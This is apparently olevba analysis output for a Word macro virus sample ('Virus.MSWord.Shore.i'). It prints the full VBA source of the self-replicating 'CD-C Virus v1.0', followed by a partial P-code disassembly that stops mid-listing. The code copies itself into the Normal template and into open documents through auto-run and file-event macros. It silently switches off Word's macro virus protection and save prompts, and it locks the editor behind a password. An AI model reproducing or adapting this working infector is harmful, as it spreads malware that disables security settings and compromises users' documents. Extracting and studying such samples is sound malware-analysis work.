olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CDC_v10.bas 
in file: Virus.MSWord.Shore.i - OLE stream: 'Macros/VBA/CDC_v10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'***** CD-C Virus v.1.0 *****
'Tembalang, Saturday, November 18, 2000
'Virus CD-C dibuat hanya sekedar iseng
'Programmer membuat virus ini karena pada Malam Minggu ini
'sendirian, tak ada yang nemenin.
'Bagi yang ingin kenalan, kirim e-mail ke mas.cdc@usa.net
'

Public Const SeriesNumber = 20001101
Public Const ModuleName = "CDC_v10", FormName = "CDC_Form", _
        mw = "Microsoft Word", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const CDE = "CD-C Electrical Engineering", _
        hcID = "Ahmad", mail = "e-mail: mas.cdc@usa.net"
        
    
Public Const msg = "Guoooblok!!! Kuncine keliru :))", _
        aaa = "fLQ-Ŕ°vtµĆ__", bbb = "iq5diani", ccc = "ssss", _
        msgcap = "Pekok...!!!", _
        code = "gathel", ddd = "Kluruk", eee = "Telp117", _
        xxx = "cdee99"
Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'Procedures in CDC module
'Procedure untuk memberi identitas pada template
Sub Buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub
'Fungsi untuk mengecek identitas virus
Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function
'Fungsi untuk mengecek adanya module dalam template
Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
'Fungsi untuk mengecek keadaan virus dalam dokumen
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function
'Procedure untuk menghilangkan semua makro
Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.CodeModule
                .DeleteLines 1, .CountOfLines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub
'Procedure duplikasi makro
Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=FormName, _
            Object:=wdOrganizerObjectProjectItems
End Sub
Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub
Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).CodeModule
        .DeleteLines 1, .CountOfLines
    End With
End Sub

Sub Copy2Document()
Dim Adoc As Document
    Stealth
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub
'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    '**** AnimateCaption
    
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        ActiveDocument.Saved = True
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    '**** AnimateCaption
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    '**** AnimateCaption
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    '**** AnimateCaption
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub
Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
   
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    InitDialog
    Animated = False
    '**** AnimateCaption
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    Buggy
    For Each Combar In Application.CommandBars
     
     
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    '**** AnimateCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub fileNewDefault()
    '**** AnimateCaption
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        '**** AnimateCaption
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
    'Application.ShowVisualBasicEditor = False

End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    '**** AnimateCaption
    Stealth
End Sub

Sub NoAccess()
    a = MsgBox(msg, vbExclamation, msgcap)
    '**** AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
    cdee = "CD-C " + EE
    sandi = xxx + Mid(code, 5, 2)
    If LCase(InputBox(pass, cdee)) = sandi Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
    '**** AnimateCaption
End Sub


Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    '**** AnimateCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    '**** AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
    '**** AnimateCaption
End Sub


Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

'Sub AnimateCaption()
'    On Error Resume Next
'    If Documents.Count > 0 Then WordBasic.viewpage
'    If Animated Then Exit Sub
'    anIntv = 2.5
'    anPos = 0
'    anCap = CDE
'    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
'    Animated = True
'End Sub
'
'
'Sub ScrollCaption()
'    If Animated Then
'        Application.Caption = Right$(anCap, anPos)
'        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
'        anPos = anPos + 1
'    End If
'
'    If anPos > Len(anCap) Then
'        On Error Resume Next
'        WordBasic.viewpage
'
'        anPos = 0
'        If anCap = CDE Then
'            anCap = Peace
'            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
'            Animated = True
'        ElseIf anCap = ddd Then
'            anCap = mw
'            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
'            Animated = True
'        ElseIf anCap = mw Then
'            anCap = OFC
'            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
'            Animated = False
'        End If
'    End If
'End Sub


Sub ShowMessage()
    With CDC_Form
        .Width = 220
        .Height = 170
        With .Judul
        .Left = 15
            .Top = 5
            .Width = 180
            .Height = 20
        End With
        With .Komentar
            .Width = 200
            .Height = 80
            .Top = 30
            .Left = 5
            .Text = "" & _
             "Dengerin nasehat symbah AM" & Chr(13) & _
             "Bermain air basah, bermain api gosong," & Chr(13) & _
             "Bermain virus asyiiik dech..." & Chr(13) & Chr(13) & _
             "CD-C EE v.10 (C) " & hcID & ", Nov, 2000" & _
             Chr(13) & mail
        End With
        With .OKButton
            .Width = 50
            .Height = 25
            .Left = 85
            .Top = 115
        End With
        .Show
    End With

End Sub

Sub HelpAbout()
   CDC_Form.Caption = "About CD-C"
   ShowMessage
End Sub


-------------------------------------------------------------------------------
VBA MACRO CDC_Form.frm 
in file: Virus.MSWord.Shore.i - OLE stream: 'Macros/VBA/CDC_Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






























Private Sub Judul_Click()

End Sub

Private Sub OKButton_Click()
   For i = 0 To 100
     Beep
   Next i
   CDC_Form.Hide
End Sub

Private Sub UserForm_Click()
   
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Shore.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/CDC_v10 - 21078 bytes
' Line #0:
' 	QuoteRem 0x0000 0x001C "***** CD-C Virus v.1.0 *****"
' Line #1:
' 	QuoteRem 0x0000 0x0026 "Tembalang, Saturday, November 18, 2000"
' Line #2:
' 	QuoteRem 0x0000 0x0025 "Virus CD-C dibuat hanya sekedar iseng"
' Line #3:
' 	QuoteRem 0x0000 0x0039 "Programmer membuat virus ini karena pada Malam Minggu ini"
' Line #4:
' 	QuoteRem 0x0000 0x0020 "sendirian, tak ada yang nemenin."
' Line #5:
' 	QuoteRem 0x0000 0x0038 "Bagi yang ingin kenalan, kirim e-mail ke mas.cdc@usa.net"
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' Line #8:
' 	Dim (Public Const) 
' 	LitDI4 0x314D 0x0131 
' 	VarDefn SeriesNumber
' Line #9:
' 	LineCont 0x0010 0A 00 08 00 0E 00 08 00 12 00 08 00 16 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0007 "CDC_v10"
' 	VarDefn ModuleName
' 	LitStr 0x0008 "CDC_Form"
' 	VarDefn FormName
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x000D "Series Number"
' 	VarDefn SerNum
' 	LitStr 0x000B "Password : "
' 	VarDefn pass
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000E ".scrollCaption"
' 	Concat 
' 	VarDefn scrollCap
' Line #10:
' Line #11:
' 	LineCont 0x0004 06 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x001B "CD-C Electrical Engineering"
' 	VarDefn CDE
' 	LitStr 0x0005 "Ahmad"
' 	VarDefn hcID
' 	LitStr 0x0017 "e-mail: mas.cdc@usa.net"
' 	VarDefn mail
' Line #12:
' Line #13:
' Line #14:
' 	LineCont 0x0010 06 00 08 00 12 00 08 00 16 00 08 00 22 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x001F "Guoooblok!!! Kuncine keliru :))"
' 	VarDefn msg
' 	LitStr 0x000C "fLQ-Ŕ°vtµĆ__"
' 	VarDefn aaa
' 	LitStr 0x0008 "iq5diani"
' 	VarDefn bbb
' 	LitStr 0x0004 "ssss"
' 	VarDefn ccc
' 	LitStr 0x000B "Pekok...!!!"
' 	VarDefn msgcap
' 	LitStr 0x0006 "gathel"
' 	VarDefn code
' 	LitStr 0x0006 "Kluruk"
' 	VarDefn ddd
' 	LitStr 0x0007 "Telp117"
' 	VarDefn eee
' 	LitStr 0x0006 "cdee99"
' 	VarDefn xxx
' Line #15:
' 	LineCont 0x0014 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
' 	Dim (Public) 
' 	VarDefn anCap (As String)
' 	VarDefn anInt (As Single)
' 	VarDefn anPos (As Integer)
' 	VarDefn Animated (As Boolean)
' 	VarDefn ToolsOptionsDlg
' 	VarDefn OrganizerDlg
' 	VarDefn ToolsTemplatesDlg
' 	VarDefn ToolsMacrosDlg
' 	VarDefn FormatStyleDlg
' Line #16:
' Line #17:
' 	QuoteRem 0x0000 0x0018 "Procedures in CDC module"
' Line #18:
' 	QuoteRem 0x0000 0x002F "Procedure untuk memberi identitas pada template"
' Line #19:
' 	FuncDefn (Sub Buggy())
' Line #20:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #21:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #22:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #23:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' Line #25:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #26:
' 	EndSub 
' Line #27:
' 	QuoteRem 0x0000 0x0025 "Fungsi untuk mengecek identitas virus"
' Line #28:
' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
' Line #29:
' 	Dim 
' 	VarDefn adp (As DocumentProperty)
' Line #30:
' 	LitVarSpecial (False)
' 	St getDocPropExist 
' Line #31:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #32:
' 	StartWithExpr 
' 	Ld adp 
' 	With 
' Line #33:
' 	LineCont 0x0004 0B 00 0C 00
' 	MemLdWith New 
' 	Ld SerNum$ 
' 	Eq 
' 	MemLdWith TypeOf 
' 	Ld msoPropertyTypeNumber 
' 	Eq 
' 	And 
' 	MemLdWith Value 
' 	Ld SeriesNumber 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #34:
' 	LitVarSpecial (True)
' 	St getDocPropExist 
' Line #35:
' 	ExitFunc 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndWith 
' Line #38:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	EndFunc 
' Line #40:
' 	QuoteRem 0x0000 0x0032 "Fungsi untuk mengecek adanya module dalam template"
' Line #41:
' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
' Line #42:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #43:
' 	LitVarSpecial (False)
' 	St getModuleExist 
' Line #44:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #45:
' 	Ld anObject 
' 	MemLd New 
' 	Ld ModuleName 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	LitVarSpecial (True)
' 	St getModuleExist 
' Line #47:
' 	ExitFunc 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	EndFunc 
' Line #51:
' 	QuoteRem 0x0000 0x0031 "Fungsi untuk mengecek keadaan virus dalam dokumen"
' Line #52:
' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
' Line #53:
' 	Ld theObject 
' 	ArgsLd getModuleExist 0x0001 
' 	Ld theObject 
' 	ArgsLd getDocPropExist 0x0001 
' 	And 
' 	St getInfected 
' Line #54:
' 	EndFunc 
' Line #55:
' 	QuoteRem 0x0000 0x0029 "Procedure untuk menghilangkan semua makro"
' Line #56:
' 	FuncDefn (Sub clearMacros(theObject As Object))
' Line #57:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #58:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #59:
' 	Ld anObject 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #60:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anObject 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	StartWithExpr 
' 	Ld anObject 
' 	MemLd CodeModule 
' 	With 
' Line #64:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #65:
' 	EndWith 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' Line #69:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #70:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	EndSub 
' Line #73:
' 	QuoteRem 0x0000 0x0019 "Procedure duplikasi makro"
' Line #74:
' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
' Line #75:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #76:
' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
' 	Ld theDestination 
' 	ArgsLd getDocPropExist 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld theDestination 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' 	EndIf 
' Line #77:
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #80:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld FormName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	Ld theDestination 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	IfBlock 
' Line #85:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	LitStr 0x0004 "xxxx"
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #86:
' 	Ld theDestination 
' 	ArgsCall clearMacros 0x0001 
' Line #87:
' 	Ld theSource 
' 	Ld theDestination 
' 	ArgsCall copyMacros 0x0002 
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	LitVarSpecial (True)
' 	Ld theDestination 
' 	ArgsMemCall Save 0x0001 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Sub Copy2Normal())
' Line #93:
' 	Dim 
' 	VarDefn ATemp (As Template)
' Line #94:
' 	ArgsCall Stealth 0x0000 
' Line #95:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #96:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall Infecting 0x0002 
' Line #97:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' Line #98:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #99:
' 	Ld ActiveDocument 
' 	Ld ATemp 
' 	ArgsCall Infecting 0x0002 
' Line #100:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' 	EndIfBlock 
' Line #102:
' Line #103:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #104:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #105:
' 	EndWith 
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' 	FuncDefn (Sub Copy2Document())
' Line #109:
' 	Dim 
' 	VarDefn Adoc (As Document)
' Line #110:
' 	ArgsCall Stealth 0x0000 
' Line #111:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #112:
' 	Ld NormalTemplate 
' 	Ld Adoc 
' 	ArgsCall Infecting 0x0002 
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #115:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	NextVar 
' Line #116:
' 	LineCont 0x0008 07 00 04 00 0E 00 08 00
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' 	EndIf 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	FuncDefn (Sub Jump2Normal(macName As String))
' Line #120:
' 	LitStr 0x0007 "normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld macName 
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #121:
' 	EndSub 
' Line #122:
' 	QuoteRem 0x0000 0x0014 "infection procedures"
' Line #123:
' 	FuncDefn (Sub AutoOpen())
' Line #124:
' 	ArgsCall Stealth 0x0000 
' Line #125:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #126:
' Line #127:
' 	Ld NormalTemplate 
' 	ArgsLd getModuleExist 0x0001 
' 	IfBlock 
' Line #128:
' 	LitStr 0x000D "Copy2Document"
' 	Paren 
' 	ArgsCall Jump2Normal 0x0001 
' Line #129:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	ElseBlock 
' Line #134:
' 	ArgsCall Copy2Normal 0x0000 
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	EndSub 
' Line #139:
' Line #140:
' 	FuncDefn (Sub FileOpen())
' Line #141:
' 	ArgsCall Stealth 0x0000 
' Line #142:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #143:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #144:
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #147:
' 	ArgsCall AutoOpen 0x0000 
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #150:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #153:
' 	EndSub 
' Line #154:
' Line #155:
' 	FuncDefn (Sub AutoClose())
' Line #156:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #157:
' 	ArgsCall Stealth 0x0000 
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	QuoteRem 0x0000 0x000C "    AutoOpen"
' Line #160:
' 	ArgsCall Copy2Document 0x0000 
' Line #161:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #162:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #163:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #164:
' 	EndSub 
' Line #165:
' Line #166:
' 	FuncDefn (Sub FileClose())
' Line #167:
' 	Dim 
' 	VarDefn afn (As String)
' Line #168:
' 	QuoteRem 0x0004 0x0013 "**** AnimateCaption"
' Line #169:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
